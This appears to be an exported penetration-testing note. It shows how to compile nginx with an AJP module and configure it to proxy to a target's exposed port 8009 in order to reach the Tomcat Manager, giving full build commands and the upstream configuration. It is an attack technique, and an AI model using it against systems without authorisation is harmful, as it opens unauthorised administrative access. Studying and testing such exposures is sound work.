<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Exploit: Nginx Reverse Proxy & AJP</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Exploit: Nginx Reverse Proxy & AJP</h1><br/><br />When we find an open AJP proxy port (8009 TCP)<br />We can use <strong>Nginx</strong> with the <strong>ajp_module</strong> to access the &quot;hidden&quot; Tomcat Manager.<br />This can be done by compiling the Nginx source code and adding the required module, as follows:<br />1. Download the Nginx source code<br />2. Download the required module<br />3. Compile Nginx source code with the <strong>ajp_module</strong>.<br />4. Create a configuration file pointing to the AJP Port<br /><br />1. Download the Nginx source code<br />    <div class="codebox"><pre>wget https://nginx.org/download/nginx-1.21.3.tar.gz<br />tar -xzvf nginx-1.21.3.tar.gz</pre></div><br />    <a href=""><img src="images/2558-1.png" alt="images/2558-1.png" /></a><br /><br />2. Download the required module<br />    <div class="codebox"><pre>git clone https://github.com/dvershinin/nginx_ajp_module.git<br />cd nginx-1.21.3<br />sudo apt install libpcre3-dev<br />./configure --add-module=`pwd`/../nginx_ajp_module --prefix=/etc/nginx --sbin-path=/usr/sbin/nginx --modules-path=/usr/lib/nginx/modules<br />make<br />sudo make install<br />nginx -V</pre></div><br />    <a href=""><img src="images/2558-2.png" alt="images/2558-2.png" /></a><br />3. Pointing to the AJP Port<br />    In /etc/nginx/conf/nginx.conf<br />    <div class="codebox"><pre>sudo nano /etc/nginx/conf/nginx.conf</pre></div><br />   1) Comment out the entire server block inside the http block<br />       <a href=""><img src="images/2558-3.png" alt="images/2558-3.png" /></a><br />   2) Append the following lines inside the http block <br />       In the following configuration, we are using port 8009, which is Tomcat&#39;s default port for AJP, and this is how we would use it in a real environment. <br />       <br />       <div class="codebox"><pre>upstream tomcats {<br />	server &lt;TARGET_SERVER&gt;:8009;<br />	keepalive 10;<br />	}<br />server {<br />	listen 80;<br />	location / {<br />		ajp_keep_conn on;<br />		ajp_pass tomcats;<br />	}<br />}</pre></div><br />       <a href=""><img src="images/2558-4.png" alt="images/2558-4.png" /></a><br />4. Start Nginx and check if everything is working correctly by issuing a cURL request to your local host<br />    <div class="codebox"><pre>sudo nginx<br />curl http://127.0.0.1:80</pre></div><br />    <a href=""><img src="images/2558-5.png" alt="images/2558-5.png" /></a><br />    <a href=""><img src="images/2558-6.png" alt="images/2558-6.png" /></a><br />5. To stop nginx<br />    <div class="codebox"><pre>sudo nginx -s stop</pre></div></div>
</body>
</html>
